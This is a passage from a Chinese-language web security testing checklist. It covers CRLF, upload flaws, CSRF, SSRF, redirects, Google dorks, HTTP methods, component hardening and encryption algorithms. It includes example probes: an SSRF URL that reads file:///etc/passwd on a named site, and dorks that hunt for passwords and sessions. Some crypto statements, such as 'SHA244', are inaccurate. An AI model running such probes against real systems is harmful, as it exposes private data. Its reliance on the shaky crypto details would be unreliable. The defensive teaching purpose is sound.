https://help.aliyun.com/knowledge_detail/37446.html?spm=5176.7837442.2.2.nCzE5s 5.2.8.5. *CRLF\u6f0f\u6d1e* \u00b6 CRLF\uff0ccarriage-return-line-feed,\u56de\u8f66\u6362\u884c\u6f0f\u6d1e\u3002 \u6848\u4f8b\u53c2\u8003\uff1a https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html \uff08\u5bf9header\u8fdb\u884c\u6ce8\u5165\uff09 \u200b 5.2.9. *\u4e0a\u4f20\u4e0b\u8f7d* \u00b6 \u8de8\u76ee\u5f55\u6587\u4ef6\u4e0b\u8f7d \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\uff08\u540e\u7f00\uff09 \u4efb\u610f\u76ee\u5f55\u6587\u4ef6\u4e0a\u4f20\uff08\u76ee\u5f55\uff09 \u8d85\u5927\u6587\u4ef6\u4e0a\u4f20\uff08\u5927\u5c0f\uff09 \u4e0a\u4f20\u6587\u4ef6\u5e9f\u5f03\u540e\u5904\u7406\uff08\u5806\u79ef\uff09 \u4e0a\u4f20\u6587\u4ef6\u540dxss\uff08\u91cd\u547d\u540d\uff09 \u4e0a\u4f20\u6587\u4ef6\u540d\u622a\u65ad\uff080x00\u6216\u80050x58,burp\u4e5f\u53ef\u4ee5\u4fee\u6539\u4e8c\u8fdb\u5236\uff0curl\u4e2d%00\uff09 \u4e0a\u4f20\u6587\u4ef6\u6743\u9650\u9650\u5236 \u538b\u7f29\u70b8\u5f39 Include\u5305\u542b\u4e0a\u4f20\uff08shtml\uff09 \u4e0a\u4f20zip\u6587\u4ef6\u540d\u4e2d\u5305\u542b../ \u672c\u5730\u6587\u4ef6\u5305\u542b\u7684\u6982\u5ff5\uff1a https://help.aliyun.com/knowledge_detail/37472.html?spm=5176.7837442.2.2.2NdNhY 5.2.10. *CSRF* \u00b6 CSRF\u3010cross site request forgery\u3011\u8de8\u7ad9\u70b9\u8bf7\u6c42\u4f2a\u9020\u3002 \u539f\u7406\uff1a\u5229\u7528\u6d4f\u89c8\u5668\u5185\u5b58\u5171\u4eab\u539f\u7406\uff0c\u5229\u7528\u7528\u6237\u8eab\u4efd\u4f2a\u9020\u7528\u6237\u52a8\u4f5c\u53d1\u9001\u5230\u670d\u52a1\u7aef\u3002\uff08\u4ece\u6076\u610f\u7ad9\u70b9\u6a21\u62df\u7528\u6237\u53d1\u9001\u6b63\u5e38\u7684\u8bf7\u6c42\u643a\u5e26cookie\uff0c\u89c17.1\uff09 5.2.10.1. *URL\u91cd\u5b9a\u5411\uff08\u8df3\u8f6c\uff09\u6f0f\u6d1e\uff1a* \u00b6 \uff08\u53c2\u8003http://drops.wooyun.org/papers/154\uff09 1\u3001\u95ee\u9898\u70b9 \u5728\u9875\u9762\u8df3\u8f6c\u7684\u5730\u65b9\uff0cURL\u4e2d\u5305\u542b\u53e6\u5916\u7684\u7f51\u5740\uff0c\u4f8b\u5982\uff1a \u7b2c\u4e00\u7c7b \u7b80\u5355URL\u8fc7\u6ee4 www.xxx.com?a=http://www.yyy.com \u7b2c\u4e8c\u7c7b \u5e95\u5c42\u64cd\u4f5c\u7c7b\u5e93\u652f\u6301\u5176\u4ed6\u534f\u8bae\u5bfc\u81f4\u8bfb\u53d6\u672c\u5730\u6216\u63a2\u6d4b\u7f51\u7edc\u4fe1\u606f http://h2w.iask.cn/h5.php?u=file:///etc/passwd \u7531\u4e8e\u5e95\u5c42\u9002\u7528\u7c7bcurl\u5e93,\u800c\u6ca1\u6709\u6b63\u786e\u8fc7\u6ee4URL\u5bfc\u81f4\uff0c\u53ef\u4ee5\u8bfb\u53d6\u5185\u7f51\u8bf8\u591a\u4fe1\u606f.\u8fd8\u6709\u5176\u4ed6\u7c7b\u4f3c\u7684\u5f62\u5f0f\uff1a \u5982file://, ftp://, telnet://\u7b49 \u7b2c\u4e09\u7c7b \u4e0d\u652f\u6301\u5176\u4ed6\u534f\u8bae\u4f46\u662f\u6ca1\u6709\u8bbe\u7f6e\u7f51\u7edc\u8fb9\u754c\uff08SSRF\u6f0f\u6d1e\u7684\u59ff\u52bf\u554a\uff09 http://wap.sogou.com/tc?url=http%3A%2F%2Fno.sohu.com%2F \u4f7f\u7528\u57df\u4e4b\u95f4\u7684\u4fe1\u4efb\uff0c\u7a81\u7834\u5230\u7cfb\u7edf\u7684\u5185\u7f51 2\u3001\u5206\u6790 \u7406\u8bba\u4e0a\u8bb2\uff0curl\u8df3\u8f6c\u5c5e\u4e8eCSRF\u7684\u4e00\u79cd\uff0c\u6211\u4eec\u9700\u8981\u5bf9\u4f20\u5165\u7684URL\u505a\u6709\u6548\u6027\u7684\u8ba4\u8bc1\uff0c\u4fdd\u8bc1\u8be5URL\u6765\u81ea\u4e8e\u6b63\u786e\u7684\u5730\u65b9\uff0c\u9650\u5236\u7684\u65b9\u5f0f\u540c\u9632\u6b62csrf\u4e00\u6837\u53ef\u4ee5\u5305\u62ec\uff1a 1\uff09referer\u7684\u9650\u5236 2\uff09\u52a0\u5165\u6709\u6548\u6027\u9a8c\u8bc1Token 3\u3001\u5bf9\u8df3\u8f6c\u7684\u5730\u5740\u6ca1\u6709\u505a\u4e25\u683c\u7684\u6821\u9a8c 5.2.11. *CORS\u6f0f\u6d1e* \u00b6 CORS\u3010cross origin resouse-sharing\u3011\u8de8\u57df\u8d44\u6e90\u5171\u4eab\u3002 \u5de5\u5177\uff1ashell of the future \u7406\u89e3\u53c2\u8003\uff1a http://www.2cto.com/Article/201209/154081.html 5.2.12. *SSRF\u6f0f\u6d1e**** *\uff08\u670d\u52a1\u7aef\u8bf7\u6c42\u4f2a\u9020\uff09**** \u00b6 \u884c\u4e3a\u7279\u70b9\uff1a\u4ece\u5176\u4ed6\u670d\u52a1\u5668\u83b7\u53d6\u6570\u636e\u8d44\u6e90\u7684\u529f\u80fd\uff0c\u5e76\u4e14\u6b64\u529f\u80fd\u83b7\u53d6\u8d44\u6e90\u7684\u8bf7\u6c42\u662f\u4ece\u670d\u52a1\u7aef\u53d1\u8d77\u7684\u3002 \u53ef\u4ee5\u5b9e\u73b0\u7684\u653b\u51fb\uff1a \u53ef\u4ee5\u5bf9\u670d\u52a1\u5668\u6240\u5728\u7684\u5185\u7f51\u3001\u672c\u5730\u7aef\u53e3\u8fdb\u884c\u626b\u63cf\u3001\u83b7\u53d6banner\u7b49 \u653b\u51fb\u8fd0\u884c\u5728\u5185\u7f51\u6216\u8005\u672c\u5730\u7684\u5e94\u7528\u7a0b\u5e8f\uff08\u6bd4\u5982\u6ea2\u51fa\uff09 \u5bf9\u5185\u7f51WEB\u5e94\u7528\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\uff0c\u8bbf\u95ee\u9ed8\u8ba4\u6587\u4ef6\u7684\u65b9\u5f0f \u653b\u51fb\u5185\u7f51WEB\u670d\u52a1\u5668\uff0cget\u8bf7\u6c42\u65b9\u5f0f \u5229\u7528file\u534f\u8bae\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\uff1a\u4f8b\u5982http://192.168.1.119/pm/www/index.php?m=bug&f=view&bugID=4052 http://netsecurity.51cto.com/art/201312/424038.htm 5.2.13. *Google\u9ed1\u5ba2* \u00b6 1\u3001\u641c\u7d22\u7ad9\u70b9\u770b\u662f\u5426\u80fd\u53d1\u73b0\u654f\u611f\u7684\u4fe1\u606f\u6216\u4e0d\u8be5\u516c\u5e03\u7684\u4fe1\u606f \u641c\u7d22\u547d\u4ee4\uff0c\u4f8b\u5982\uff1a l site:yizhen.cn l site:yizhen.cn yizhen.cn:password l site:yizhen.cn inurl:session l site:yizhen inanchor:\u4fee\u6539\u5bc6\u7801 l cache\uff1a www.yizhen.cn \u53c2\u8003\uff1a http://www.cnblogs.com/xuanhun/p/3910134.html 5.2.14. *\u5176\u4ed6* \u00b6 http\u5f00\u653e\u65b9\u6cd5\u6d4b\u8bd5 \u4e0d\u5b89\u5168\u7684\u65b9\u6cd5\uff1aput\u3001delete\u3001trace\u3001connect TRACE: \u8fd9\u4e2a\u65b9\u6cd5\u7b80\u5355\u8fd4\u56de\u5ba2\u6237\u7aef\u53d1\u9001\u7ed9\u670d\u52a1\u5668\u7684\u6240\u6709\u4fe1\u606f\uff0c\u4e3b\u8981\u7528\u4e8e\u8c03\u8bd5\u76ee\u7684\u3002\u8fd9\u4e2a\u65b9\u6cd5\u6700\u521d\u88ab\u8ba4\u4e3a\u6ca1\u6709\u5371\u5bb3\uff0c\u88abJermiah Grossman\u53d1\u73b0\u80fd\u88ab\u7528\u4e8e\u5b9e\u65bdXST CONNECT: \u8fd9\u4e2a\u65b9\u6cd5\u5141\u8bb8\u5ba2\u6237\u7aef\u4f7f\u7528web\u670d\u52a1\u5668\u4f5c\u4e3a\u4ee3\u7406\u3002 DELETE: \u8fd9\u4e2a\u65b9\u6cd5\u5141\u8bb8\u5ba2\u6237\u7aef\u5220\u9664web\u670d\u52a1\u5668\u4e0a\u7684\u4e00\u4e2a\u6587\u4ef6\u3002\u653b\u51fb\u8005\u80fd\u5229\u7528\u4ed6\u7b80\u5355\u76f4\u63a5\u7834\u574f\u7f51\u7ad9\u6216\u8005\u5b9e\u65bd\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002 \u8fd9\u4e2a\u65b9\u6cd5\u5141\u8bb8\u5ba2\u6237\u7aef\u5411web\u670d\u52a1\u5668\u4e0a\u4f20\u65b0\u7684\u6587\u4ef6\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u4ed6\u6765\u4e0a\u4f20\u6076\u610f\u6587\u4ef6\uff08\u6bd4\u5982\u4e00\u4e2aasp\u6587\u4ef6\u901a\u8fc7\u8c03\u7528cmd.exe\u6765\u6267\u884c\u547d\u4ee4\uff09\uff0c\u6216\u8005\u7b80\u5355\u4f7f\u7528\u53d7\u5bb3\u8005\u670d\u52a1\u5668\u4f5c\u4e3a\u6587\u4ef6\u4ed3\u5e93\u3002 banner\u4fe1\u606f\u68c0\u67e5 HTTP\u65b9\u6cd5\u7be1\u6539(\u5df2\u9a8c\u8bc1\uff0c\u6ca1\u6709\u6b64\u95ee\u9898\uff1b\u95ee\u9898\u6848\u4f8bhttps:// www.sobug.com/article/detail/25 ) JavaScript DDOS\uff08\u5207\u6362https\u540e\u95ee\u9898\u89e3\u51b3\uff09 \u7f13\u51b2\u5668\u6ea2\u51fa\u6f0f\u6d1e\uff0cjava\u7684\u4e0d\u6d89\u53ca \u7ba1\u7406\u63a5\u53e3\u66b4\u529b\u679a\u4e3e\uff08DirBuster\uff09 \u6d4b\u8bd5HEAD\u8bbf\u95ee\u63a7\u5236\u7ed5\u8fc7 \u8de8\u57df\u7b56\u7565\u6d4b\u8bd5 \u6570\u503c\u6ea2\u51fa \u4e0d\u7ba1\u6574\u6570\uff0c\u6d6e\u70b9\u6570\uff0c\u957f\u6574\u6570\u7b49\u90fd\u662f\u6709\u4e00\u4e2a\u53ef\u4ee5\u8868\u793a\u7684\u6700\u5927\u503c\uff0c\u5982\u679c\u4e00\u4e2a\u8be5\u7c7b\u578b\u53d8\u91cf\u88ab\u8d4b\u4e88\u8d85\u8fc7\u5176\u6700\u5927\u503c\u7684\u65f6\u5019\u5c31\u4f1a\u51fa\u73b0\u6ea2\u51fa\uff0c\u800c\u627e\u51fa\u8be5\u53d8\u91cf\u7684\u503c\u5f02\u5e38\u3002 5.2.15. *\u91cd\u653e\u653b\u51fb* \u00b6 \u91cd\u653e\u591a\u6b21\u8bf7\u6c42\u6d88\u8017\u7cfb\u7edf\u8d44\u6e90\u7684\u8bf7\u6c42\uff0c\u9020\u6210dos\u3002\u7b5b\u9009\u51fa\u8f83\u4e3a\u6d88\u8017\u8d44\u6e90\u7684\u8bf7\u6c42\uff0c\u68c0\u67e5\u7cfb\u7edf\u662f\u5426\u6709\u9632\u91cd\u653e\u7b56\u7565\u6216\u8005\u673a\u5236\u3002 5.2.16. *\u5bb9\u5668\u7684\u5b89\u5168* \u00b6 5.2.16.1. *Apache tomcat* \u00b6 1\uff09\u5b98\u7f51\u516c\u5e03\u7684\u5b89\u5168\u6f0f\u6d1e\u8865\u4e01\u5347\u7ea7 http://tomcat.apache.org/security-7.html#Apache_Tomcat_7.x_vulnerabilities 2\uff09\u8fd0\u884c\u8d26\u6237 \u5efa\u7acb\u72ec\u7acb\u7528\u6237\uff0c\u7528\u6237\u540d\u548c\u7ec4\u540d\u5747\u4e3atomcat\uff0c\u4e0d\u8bbe\u7f6e\u5bc6\u7801\uff08\u5373\u7981\u6b62SSH\u767b\u5f55\uff09\uff0ctomcat\u8fdb\u7a0b\u4ee5\u6b64\u5e10\u53f7\u8eab\u4efd\u8fd0\u884c\uff0c\u4e25\u7981\u4ee5root\u6743\u9650\u8fd0\u884ctomcat\uff0c\u7981\u6b62\u4ee5\u4e2a\u4eba\u5e10\u53f7\u6216\u5176\u4ed6\u6709shell\u6743\u9650\u7684\u5e10\u53f7\u8fd0\u884ctomcat\u3002 3\uff09\u5220\u9664Tomcat\u81ea\u5e26\u9879\u76ee 4\uff09\u68c0\u67e5tomcat\u5df2\u77e5\u7684\u5e26\u6709\u98ce\u9669\u7684\u914d\u7f6e a) \u7981\u7528\u5e94\u7528\u7a0b\u5e8f\u81ea\u52a8\u90e8\u7f72\u529f\u80fd\uff08\u5f85\u8003\u8651\uff09 b) \u7981\u7528webdav c) \u5b9a\u5236Tomcat\u51fa\u9519\u4fe1\u606f d) \u5173\u95edTomcat\u7684\u76ee\u5f55\u5217\u8868\u529f\u80fd e) \u9650\u5236http\u8bf7\u6c42\u7684\u6d88\u606f\u4e3b\u4f53\u7684\u5927\u5c0f f) \u7981\u6b62\u914d\u7f6eTomcat\u7684\u7f51\u7edc\u8fde\u63a5\u8d85\u65f6\u65f6\u95f4\u4e3a0\u6216-1 g) \u53ef\u6267\u884c\u6587\u4ef6\u53ea\u80fd\u7531Tomcat\u5c5e\u4e3b\u7528\u6237\u4fee\u6539 h) \u914d\u7f6e\u6587\u4ef6\u53ea\u80fd\u7531Tomcat\u5c5e\u4e3b\u7528\u6237\u4fee\u6539 i) \u65e5\u5fd7\u6587\u4ef6\u53ea\u80fd\u7531Tomcat\u5c5e\u4e3b\u7528\u6237\u4fee\u6539\u548c\u6267\u884c j) \u914d\u7f6e\u865a\u62df\u76ee\u5f55\uff0c\u7528\u4ee5\u9690\u85cf\u540e\u53f0\u8def\u5f84 k) \u7981\u7528SSI\u548cCGI\u529f\u80fd l) \u4e0d\u5141\u8bb8\u4f7f\u7528SetUID\u7a0b\u5e8f\uff0c\u5c24\u5176\u662froot\u8eab\u4efd\u7684SetUID\u7a0b\u5e8f m) \u5f00\u542fTomcat\u7684\u65e5\u5fd7\u529f\u80fd\uff1a\u6b63\u5e38\u7684\u8bbf\u95ee\u65e5\u5fd7\u548c\u9519\u8bef\u8bf7\u6c42\u65e5\u5fd7\u3002\u65e5\u5fd7\u6587\u4ef6\u7684\u8bb0\u5f55\u4e2d\u5305\u542b\u8bbf\u95ee\u65f6\u95f4\u3001\u5185\u5bb9\u3001\u7ed3\u679c\u53ca\u8bf7\u6c42\u7528\u6237\u7684ip\u7b49\u5173\u952e\u4fe1\u606f \u5f71\u54cd\u8f83\u5927\u7684\u6f0f\u6d1e\uff1a CVE-2016-1240 tomcat\u5730\u6743\u7528\u6237\u63d0\u6743\u6f0f\u6d1e\u3002\uff082016-10\uff09 5.2.17. *\u5176\u4ed6\u7ec4\u4ef6\u5b89\u5168* \u00b6 5.2.17.1. *Nginx* \u00b6 \u5b98\u7f51\u5b89\u5168\u6f0f\u6d1e\u5148\u5173\u94fe\u63a5\uff1a http://nginx.org/en/security_advisories.html \u5f71\u54cd\u8f83\u5927\u7684\u6f0f\u6d1e\uff1a CVE-2016-1247 \u63d0\u6743\u6f0f\u6d1e\uff0c\u501f\u52a9nginx\u65e5\u5fd7\uff0c\u63d0\u53d6\u5230root\u3002\uff082016-10\uff09 5.2.17.2. *Jquery* \u00b6 http://192.168.1.120:8080/amol-hospital/js/jquery-1.9.1.min.js http://192.168.1.120:8080/amol-hospital/js/ueditor/third-party/jquery-1.10.2.min.js \u5728\u5b98\u7f51\u4e0a\u6ca1\u6709\u627e\u5230\u76f8\u5e94\u7684\u5b89\u5168\u6f0f\u6d1e\u5217\u8868 https://blog.jquery.com/2013/02/04/jquery-1-9-1-released/ Jquery\u4e24\u4e2a\u7248\u672c\u95f4\u66f4\u65b0\u65e5\u5fd7\uff0c\u5176\u4e2d\u6709\u4e24\u5904vulnerable\u5b57\u6837 https://github.com/jquery/jquery/compare/1.9.1...1.12.3 5.2.17.3. *Java\u6f0f\u6d1e* \u00b6 \uff08\u653e\u5230\u64cd\u4f5c\u7cfb\u7edf\u90e8\u5206\uff0cnessus\u53ef\u4ee5\u5f88\u597d\u7684\u68c0\u67e5\u8fd9\u4e2a\uff09 5.2.17.4. *\u767e\u5ea6Ueditor\uff081.4.3\uff09* \u00b6 5.2.17.5. *Node.js(\u8d85\u58f0\u89c6\u9891\u4f7f\u7528)* \u00b6 node -v v0.10.42 5.2.17.6. *Spring* \u00b6 5.2.17.7. *Mybitas* \u00b6 5.2.17.8. *Druid* \u00b6 \u6570\u636e\u5e93\u8fde\u63a5\u6c60\u7ec4\u4ef6\uff0c\u5305\u62ec\u56db\u90e8\u5206\uff1aDruidDriver\u3001DruidDataSource\u3001SQLParsr\u3001\u6269\u5c55\u7ec4\u4ef6\u3002 \u53ef\u4ee5\u76d1\u63a7\u6570\u636e\u5e93\u8bbf\u95ee\u6027\u80fd\uff0cDruid\u5185\u7f6e\u63d0\u4f9b\u4e86\u4e00\u4e2a\u529f\u80fd\u5f3a\u5927\u7684 StatFilter \u63d2\u4ef6\uff0c\u80fd\u591f\u8be6\u7ec6\u7edf\u8ba1SQL\u7684\u6267\u884c\u6027\u80fd\uff0c\u8fd9\u5bf9\u4e8e\u7ebf\u4e0a\u5206\u6790\u6570\u636e\u5e93\u8bbf\u95ee\u6027\u80fd\u6709\u5e2e\u52a9\u3002\u66ff\u6362DBCP\u548cC3P0\u3002Druid\u63d0\u4f9b\u4e86\u4e00\u4e2a\u9ad8\u6548\u3001\u529f\u80fd\u5f3a\u5927\u3001\u53ef\u6269\u5c55\u6027\u597d\u7684\u6570\u636e\u5e93\u8fde\u63a5\u6c60\u3002SQL\u6267\u884c\u65e5\u5fd7\uff0cDruid\u63d0\u4f9b\u4e86\u4e0d\u540c\u7684LogFilter\uff0c\u80fd\u591f\u652f\u6301Common-Logging\u3001Log4j\u548cJdkLog\uff0c\u4f60\u53ef\u4ee5\u6309\u9700\u8981\u9009\u62e9\u76f8\u5e94\u7684LogFilter\uff0c\u76d1\u63a7\u4f60\u5e94\u7528\u7684\u6570\u636e\u5e93\u8bbf\u95ee\u60c5\u51b5\u3002\u6269\u5c55JDBC\uff0c\u5982\u679c\u4f60\u8981\u5bf9JDBC\u5c42\u6709\u7f16\u7a0b\u7684\u9700\u6c42\uff0c\u53ef\u4ee5\u901a\u8fc7Druid\u63d0\u4f9b\u7684Filter\u673a\u5236\uff0c\u5f88\u65b9\u4fbf\u7f16\u5199JDBC\u5c42\u7684\u6269\u5c55\u63d2\u4ef6\u3002 1\u3001\u8bbf\u95ee\u6ca1\u6709\u6743\u9650\u63a7\u5236 5.2.17.9. *Turnserver* \u00b6 TurnServer \u662f\u4e00\u4e2aTURN\u534f\u8bae\u7684\u5f00\u6e90\u5b9e\u73b0\u3002 \u8be5\u534f\u8bae\u5141\u8bb8\u4e00\u4e2a\u5ba2\u6237\u7aef\u4ee5relay\u65b9\u5f0f\u83b7\u5f97IP\u5730\u5740\u548c\u7aef\u53e3\u3002\u8fd9\u5bf9\u4e8esymmetric \u7c7b\u578b\u7684NAT\u6216\u8005\u9632\u706b\u5899\u4e24\u8fb9\u8bbe\u5907\u7684\u901a\u4fe1\u975e\u5e38\u6709\u7528\u3002 TurnServer\u9879\u76ee\u65e8\u5728\u517c\u5bb9\u5730\u5904\u7406 TURN \u548c STUN\u8bf7\u6c42 (RFC 5766 , RFC 5389)\uff0c\u540c\u65f6\u4e5f\u652f\u6301 RFC6156 \u5373 TURN-IPV6 (relay between IPv4-IPv6, IPv6-IPv4 and IPv6-IPv6 addresses) \u548c RFC6062 \u5373TURN-TCP (relay data with TCP) 5.2.17.10. *Terracotta(session\u5171\u4eab)* \u00b6 5.2.17.11. *phpMyAdmin* \u00b6 http://www.phpmyadmin.net/security/ 5.2.17.12. *Redis* \u00b6 1\u3001\u6307\u5b9aredis\u670d\u52a1\u4f7f\u7528\u7684\u7f51\u5361 \uff08\u9700\u8981\u91cd\u542fredis\u624d\u80fd\u751f\u6548\uff09 \u5728 redis.conf \u6587\u4ef6\u4e2d\u627e\u5230 \u201c# bind 127.0.0.1\u201d \uff0c\u628a\u524d\u9762\u7684#\u53f7\u53bb\u6389\uff0c\u7136\u540e\u4fdd\u5b58\u3002\u6ce8\uff1a\u4fee\u6539\u540e\u53ea\u6709\u672c\u673a\u624d\u80fd\u8bbf\u95eeRedis\u3002 2\u3001\u8bbe\u7f6e\u8bbf\u95ee\u5bc6\u7801 \uff08\u9700\u8981\u91cd\u542fredis\u624d\u80fd\u751f\u6548\uff09 \u5728 redis.conf \u4e2d\u627e\u5230\u201crequirepass\u201d\u5b57\u6bb5\uff0c\u5728\u540e\u9762\u586b\u4e0a\u4f60\u9700\u8981\u7684\u5bc6\u7801\uff0cRedis\u5ba2\u6237\u7aef\u4e5f\u9700\u8981\u4f7f\u7528\u6b64\u5bc6\u7801\u6765\u8bbf\u95eeRedis\u670d\u52a1\u3002 3\u3001\u4fee\u6539Redis\u670d\u52a1\u8fd0\u884c\u8d26\u53f7 \uff08\u9700\u8981\u91cd\u542fredis\u624d\u80fd\u751f\u6548\uff09 \u8bf7\u4ee5\u8f83\u4f4e\u6743\u9650\u8d26\u53f7\u8fd0\u884cRedis\u670d\u52a1\uff0c\u4e14\u7981\u7528\u8be5\u8d26\u53f7\u7684\u767b\u5f55\u6743\u9650\u3002\u53e6\u5916\u53ef\u4ee5\u9650\u5236\u653b\u51fb\u8005\u5f80\u654f\u611f\u5199\u5165\u6587\u4ef6\uff0c\u4f46\u662fRedis\u6570\u636e\u8fd8\u662f\u80fd\u88ab\u9ed1\u5ba2\u8bbf\u95ee\u5230\uff0c\u6216\u8005\u88ab\u9ed1\u5ba2\u6076\u610f\u5220\u9664\u3002 4\u3001\u8bbe\u7f6e\u9632\u706b\u5899\u7b56\u7565 \u5982\u679c\u6b63\u5e38\u4e1a\u52a1\u4e2dRedis\u670d\u52a1\u9700\u8981\u88ab\u5176\u4ed6\u670d\u52a1\u5668\u6765\u8bbf\u95ee\uff0c\u53ef\u4ee5\u8bbe\u7f6eiptables\u7b56\u7565\u4ec5\u5141\u8bb8\u6307\u5b9a\u7684IP\u6765\u8bbf\u95eeRedis\u670d\u52a1\u3002 \u53c2\u8003\uff1a https://help.aliyun.com/knowledge_detail/37447.html?spm=5176.7837442.2.10.nCzE5s 5.2.17.13. *Fastjson\u5f00\u6e90jar* \u00b6 https://github.com/alibaba/fastjson/wiki/security_update_20170315 fastjson\u6700\u65b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u9ad8\u5371\u5b89\u5168\u6f0f\u6d1e\uff0c\u5f53\u524d\u6d89\u53ca1.2.24\u4e4b\u524d\u7248\u672c \u6211\u4eec\u7528\u76841.1.41 5.2.18. *Web\u6728\u9a6c* \u00b6 \u5e38\u89c1\u7684\u7b80\u5355\u5f62\u5f0f--\u8bf1\u5bfc\u4f18\u5316\u6253\u5f00\u5177\u6709\u7f51\u9875\u6728\u9a6c\u7684\u9875\u9762\uff0c\u4e00\u822c\u662f\u5199\u5165js\u5f15\u7528\u5927\u9a6c\u7684\u4ee3\u7801\u7f51\u9875\uff0c\u7528\u6237\u6253\u5f00\u8bf1\u5bfc\u7f51\u9875\u540e\u5728\u7535\u8111\u4e0a\u5b9e\u9645\u4e0a\u5df2\u7ecf\u9ed8\u8ba4\u8fd0\u884c\u4e86\u4e0b\u8f7d\u5927\u9a6c\u548c\u6267\u884c\u5927\u9a6c\u7684\u64cd\u4f5c 5.3. *\u654f\u611f\u6570\u636e\u4fdd\u62a4* \u00b6 5.3.1. *\u52a0\u5bc6\u7b97\u6cd5* \u00b6 \u7b97\u6cd5\u5217\u8868\u80fd\u7528\uff0c\u4e0d\u80fd\u7528 \u5f31\u7b97\u6cd5\uff1amd2\uff0cmd4\uff0cmd5\uff082004\u5e74\u7684\u56fd\u9645\u5bc6\u7801\u5b66\u4f1a\u8bae\uff08Crypto\u20192004\uff09\u738b\u5c0f\u4e91\u8bc1\u660e\u4e86MD5\u53ef\u4ee5\u88ab\u78b0\u649e\uff0c\u81f3\u6b64\uff0cMD5\u4e0d\u518d\u5b89\u5168\uff09 \uff0csha1\uff0cblowfish \u63a8\u8350\u7b97\u6cd5\uff1asha256\uff0caes128 \u53ef\u9006\u7684\u52a0\u5bc6\u7b97\u6cd5\uff1ades 3des aes128 \u53ef\u9006\u52a0\u5bc6\u7b97\u6cd5\u53c8\u5206\u4e3a\u4e24\u5927\u7c7b\uff1a\u201c\u5bf9\u79f0\u5f0f\u201d\u548c\u201c\u975e\u5bf9\u79f0\u5f0f\u201d\u3002 \u5bf9\u79f0\u5f0f\u52a0\u5bc6\u7279\u70b9\uff1a\u52a0\u5bc6\u548c\u89e3\u5bc6\u4f7f\u7528\u540c\u4e00\u4e2a\u5bc6\u94a5\uff0c\u901a\u5e38\u79f0\u4e4b\u4e3a\u201cSession Key \u201d\u3002 DES\u30013DES\u3001DESX\u3001Blowfish\u3001IDEA\u3001RC4\u3001RC5\u3001RC6\u548cAES \u975e\u5bf9\u79f0\u5f0f\u52a0\u5bc6\u7279\u70b9\uff1a\u52a0\u5bc6\u548c\u89e3\u5bc6\u6240\u4f7f\u7528\u7684\u4e0d\u662f\u540c\u4e00\u4e2a\u5bc6\u94a5\uff0c\u800c\u662f\u4e24\u4e2a\u5bc6\u94a5\uff1a\u4e00\u4e2a\u79f0\u4e3a\u201c\u516c\u94a5\u201d\uff0c\u53e6\u4e00\u4e2a\u79f0\u4e3a\u201c\u79c1\u94a5\u201d\uff1b\u5b83\u4eec\u4e24\u4e2a\u5fc5\u987b\u914d\u5bf9\u4f7f\u7528\uff0c\u5426\u5219\u4e0d\u80fd\u6253\u5f00\u52a0\u5bc6\u6587\u4ef6\u3002\u8fd9\u91cc\u7684\u201c\u516c\u94a5\u201d\u662f\u6307\u53ef\u4ee5\u5bf9\u5916\u516c\u5e03\u7684\uff0c\u201c\u79c1\u94a5\u201d\u5219\u53ea\u80fd\u7531\u6301\u6709\u4eba\u672c\u4eba\u77e5\u9053\u3002 \u5e38\u89c1\u7684\u975e\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\uff1aRSA\u3001ECC\uff08\u79fb\u52a8\u8bbe\u5907\u7528\uff09\u3001Diffie-Hellman\u3001El Gamal\u3001DSA\uff08\u6570\u5b57\u7b7e\u540d\u7528\uff09 \u4e0d\u53ef\u9006\u52a0\u5bc6\u7b97\u6cd5\uff1asha256 sha512 md5 \u4e0d\u53ef\u9006\u52a0\u5bc6\u7b97\u6cd5\u7684\u7279\u5f81\u662f\uff0c\u52a0\u5bc6\u8fc7\u7a0b\u4e2d\u4e0d\u9700\u8981\u4f7f\u7528\u5bc6\u94a5\uff0c\u8f93\u5165\u660e\u6587\u540e\u7531\u7cfb\u7edf\u76f4\u63a5\u7ecf\u8fc7\u52a0\u5bc6\u7b97\u6cd5\u5904\u7406\u6210\u5bc6\u6587\u3002\u8fd9\u79cd\u52a0\u5bc6\u540e\u7684\u6570\u636e\u662f\u65e0\u6cd5\u88ab\u89e3\u5bc6\u7684\uff0c\u53ea\u6709\u91cd\u65b0\u8f93\u5165\u660e\u6587\u3002 \u5e38\u89c1\u7684Hash\u7b97\u6cd5\uff1aMD2\u3001MD4\u3001MD5\u3001HAVAL\u3001SHA\u3001SHA-1\u3001HMAC\u3001HMAC-MD5\u3001HMAC-SHA1 \u53c2\u8003\uff1a http://www.360doc.com/content/13/0402/15/3862791_275529254.shtml http://book.51cto.com/art/201109/294599.htm MD5\u8f93\u51fa128bit SHA1\u8f93\u51fa160bit SHA256\u8f93\u51fa256bit \u53e6\u5916\u8fd8\u6709SHA244,SHA512 \u5206\u522b\u8f93\u51fa244bit\uff0c512bit \u95ee\u9898\u5206\u6790 \u6570\u636e\u5e93\u4e2d\u7684\u5bc6\u7801\u7684\u673a\u5bc6\u7b97\u6cd5\u63a8\u8350\uff1a 1\u3001\u4f7f\u7528\u4e0d\u53ef\u9006\u52a0\u5bc6\u7b97\u6cd5 2\u3001\u4f7f\u7528\u52a0\u76d0\uff08\u907f\u514d\u9884\u5148\u8ba1\u7b97\u5f69\u8679\u8868\uff09 \u5efa\u8bae\u7684\u7528\u6237\u5bc6\u7801\u52a0\u5bc6\u5f62\u5f0f\uff1a http\uff1a\u82e5\u901a\u9053\u672a\u52a0\u5bc6\uff0c\u5bc6\u7801\u5728\u5ba2\u6237\u7aef\u4f7f\u7528\u53ef\u9006\u52a0\u5bc6\u7b97\u6cd5AES-256\u5e76\u52a0\u76d0\uff08\u4ece\u670d\u52a1\u7aef\u83b7\u53d6\u6311\u6218\u7801\u5373\u76d0\u503c\uff09\uff0c\u4f20\u8f93\u5230\u670d\u52a1\u7aef\u518d\u89e3\u5bc6\u3002 